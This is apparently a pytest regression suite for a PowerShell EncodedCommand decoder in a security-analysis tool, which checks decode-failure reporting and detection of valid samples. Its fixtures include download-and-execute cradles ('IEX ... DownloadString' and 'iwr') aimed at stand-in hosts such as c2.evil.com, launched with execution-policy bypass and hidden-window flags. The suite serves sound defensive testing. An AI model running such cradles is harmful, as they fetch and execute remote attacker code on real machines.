"""Regression suite for the user-reported corrupt EncodedCommand sample.

Locked with SOC user 2026-07-25.

The blob below (`_CORRUPT_BLOB`) is real-world corrupted — Base64 decodes
successfully but the resulting bytes are NOT valid UTF-16LE (first bad
byte at offset 80). Previously the semantic engine silently returned the
latin-1 view of the bytes, producing binary garbage like `Sr\x80\t`t`
in the UI. The fix hard-halts semantic analysis with `decode_error` and
returns a structured recovery report the UI renders as a Decode Failure
card.
"""
from __future__ import annotations

import sys
import base64
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.semantic.ps_semantic import analyze                          # noqa: E402
from v2.semantic.ps_recovery import (                                  # noqa: E402
    recover_powershell_from_b64,
    looks_like_powershell,
)


_CORRUPT_BLOB = (
    "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZ"
    "QB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUAEQAbwB3AG4AbABvAGEAZABTAHQ"
    "AcgBpAG4AZwAoACcAaAB0AHQAcAAA6ACAALwA0ADUALgAxADMANgAuADIAMwAwAC"
    "AWAADEAOgA0ADAAMAAwACAAyADMANABSADIAMWAnACkAOwA="
)
_CORRUPT_CMDLINE = f"powershell.exe -exec bypass -enc {_CORRUPT_BLOB}"


# ── The bug that must never come back ────────────────────────────
def test_corrupted_blob_returns_decode_error_not_garbage() -> None:
    r = analyze(_CORRUPT_CMDLINE)
    assert r.detected is True, "PowerShell invocation should still be detected"
    assert r.decode_outcome == "decode_error", (
        f"corrupt blob must produce decode_error; got {r.decode_outcome!r}")
    assert r.recovered_script == "", (
        f"recovered_script MUST be empty on decode_error to prevent UI garbage; "
        f"got {r.recovered_script[:80]!r}")
    assert r.decode_error, "decode_error dict must be populated"
    assert r.decode_error["b64_status"] == "succeeded"
    assert r.decode_error["b64_bytes"] == 179
    assert r.decode_error["first_invalid_offset"] == 80
    assert "illegal encoding" in r.decode_error["invalid_reason"]


def test_corrupted_blob_halts_semantic_pipeline() -> None:
    """AST / behaviors / verdict MUST all be empty on decode_error."""
    r = analyze(_CORRUPT_CMDLINE)
    assert r.ast == []
    assert r.behaviors == []
    assert r.behaviors_v2 == []
    assert r.evidence_graph == {}
    assert r.ast_tree == {}
    assert r.resolved_variables == {}
    assert r.verdict_breakdown == {}
    assert r.mitre_ids == []


def test_decode_error_timeline_records_every_attempt() -> None:
    """The Full Decode Timeline must show every decoder we tried,
    including the ones that were skipped, with a plain-English reason."""
    r = analyze(_CORRUPT_CMDLINE)
    steps = r.decode_timeline
    kinds = {s["decoder"] for s in steps}
    # These are the audit-critical steps
    for required in ("input_scanner", "extract_encodedcommand",
                     "base64_decode", "utf16le_strict",
                     "compression_sniff", "utf8_strict",
                     "ascii_strict", "utf16be_strict",
                     "xor_brute", "semantic_halt"):
        assert required in kinds, f"missing timeline step: {required}"
    # Every step must have a reason
    for s in steps:
        assert s["reason"], f"step {s['decoder']} has no reason"
        assert s["status"] in ("applied", "skipped", "failed")


def test_decode_error_lists_all_possible_causes() -> None:
    r = analyze(_CORRUPT_CMDLINE)
    causes = r.decode_error.get("possible_causes") or []
    assert len(causes) >= 3
    causes_txt = " · ".join(causes).lower()
    for keyword in ("corrupted", "truncated", "nested", "encrypt"):
        assert keyword in causes_txt, f"cause list missing keyword: {keyword}"


def test_decode_error_hex_preview_is_hex_not_text() -> None:
    """The Decode Failure card must render bytes as hex, never as
    latin-1 rendered chars — this prevents the garbage regression."""
    r = analyze(_CORRUPT_CMDLINE)
    hex_preview = r.decode_error.get("hex_preview") or ""
    assert hex_preview
    # All chars must be hex digits (0-9a-f) — no ascii text
    assert all(c in "0123456789abcdef" for c in hex_preview.lower()), (
        f"hex_preview leaked non-hex characters: {hex_preview[:40]!r}")


# ── The happy path must not regress ──────────────────────────────
def test_valid_encodedcommand_still_recovers_and_scores() -> None:
    good_ps = "IEX (New-Object System.Net.WebClient).DownloadString('http://c2.evil.com/x.ps1')"
    good_blob = base64.b64encode(good_ps.encode("utf-16-le")).decode()
    r = analyze(f"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand {good_blob}")
    assert r.decode_outcome == "fully_decoded"
    assert r.decode_error == {}   # no failure card
    # Post-deobfuscation the alias IEX is expanded to Invoke-Expression.
    assert (r.recovered_script.lower().startswith("iex")
            or "invoke-expression" in r.recovered_script.lower())
    assert r.behaviors_v2, "v2 behaviors must be populated on happy path"
    assert r.verdict_breakdown.get("verdict") == "malicious"


# ── The recovery module directly ──────────────────────────────────
def test_recovery_module_rejects_latin1_garbage() -> None:
    """The old bug: `bytes.decode('latin-1')` always succeeds, so a naïve
    fallback chain silently accepted binary garbage. `looks_like_powershell`
    must reject latin-1-decoded garbage."""
    raw = base64.b64decode(_CORRUPT_BLOB, validate=False)
    latin1_view = raw.decode("latin-1")
    ok, reason = looks_like_powershell(latin1_view)
    assert not ok, (
        f"latin-1 view of corrupt bytes must be rejected; instead "
        f"looks_like_powershell returned OK ({reason!r})")


def test_recovery_module_accepts_clean_utf16le() -> None:
    good_ps = "Get-Process | Where-Object { $_.Name -eq 'notepad' }"
    good_blob = base64.b64encode(good_ps.encode("utf-16-le")).decode()
    rep = recover_powershell_from_b64(good_blob)
    assert rep.status == "ok"
    assert rep.winner == "utf16le_strict"
    assert rep.recovered_script == good_ps


def test_recovery_module_recovers_gzip_wrapped_payload() -> None:
    """Compression fallback must fire when the payload is Base64→GZip→UTF-16LE."""
    import gzip
    good_ps = "IEX (iwr 'http://staged.example.com/next.ps1')"
    gzipped = gzip.compress(good_ps.encode("utf-16-le"))
    b64 = base64.b64encode(gzipped).decode()
    rep = recover_powershell_from_b64(b64)
    assert rep.status == "ok", (
        f"gzip-wrapped payload must recover; got status={rep.status}, "
        f"attempts={[a.decoder + '/' + a.status for a in rep.attempts]}")
    assert rep.winner.startswith("gzip_then_")
    assert "iwr" in rep.recovered_script


# ── Partial recovery + confidence scoring (locked 2026-07-25) ─────
def test_partial_recovery_extracts_readable_prefix() -> None:
    """When the corrupt sample fails full recovery, the diagnostic
    prefix `iex (New-Object S…` MUST be surfaced as partial_recovery
    but NEVER promoted to recovered_script."""
    r = analyze(_CORRUPT_CMDLINE)
    partial = r.decode_error.get("partial_recovery")
    assert partial, "partial_recovery must be populated on this corrupt sample"
    assert "iex" in partial["prefix_text"].lower(), (
        f"partial prefix should start with `iex`; got {partial['prefix_text']!r}")
    assert partial["prefix_bytes"] > 0
    assert partial["corrupted_bytes"] > 0
    # It must NEVER become recovered_script
    assert r.recovered_script == ""
    # Confidence note must explicitly warn it's diagnostic
    assert "diagnostic" in partial["confidence_note"].lower()


def test_confidence_band_low_on_partial_recovery() -> None:
    r = analyze(_CORRUPT_CMDLINE)
    assert r.decode_error["confidence_band"] == "low"
    assert r.decode_error["recovered_layers"]  # non-empty like "0/6"
    # low-band reason must acknowledge the partial state
    assert "partial" in r.decode_error["confidence_reason"].lower() or \
           "prefix" in r.decode_error["confidence_reason"].lower()


def test_confidence_band_high_on_clean_utf16le() -> None:
    good_ps = "Get-Process | Where-Object { $_.Name -eq 'notepad' }"
    good_blob = base64.b64encode(good_ps.encode("utf-16-le")).decode()
    rep = recover_powershell_from_b64(good_blob)
    assert rep.confidence_band == "high"
    assert "UTF-16LE strict" in rep.confidence_reason


def test_verdict_never_zero_on_decode_error() -> None:
    """A decode failure must NOT show risk 0/100 (which would imply
    benign). Instead: verdict='decode_error', risk_score=0 in the
    LEGACY field for backward compat but the UI-facing verdict_display
    must be 'Undetermined'."""
    r = analyze(_CORRUPT_CMDLINE)
    assert r.decode_error["confidence_band"] in ("low", "none"), (
        "decode_error must not report 'high' confidence")
    # Ensure the decode_error dict carries the Undetermined signal
    # (verdict_display is set by the API wrapper — the semantic layer
    # here only guarantees status + confidence_band are honest).
    assert r.decode_outcome == "decode_error"
    assert r.verdict == "unknown"    # NOT 'malicious' or 'suspicious'


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
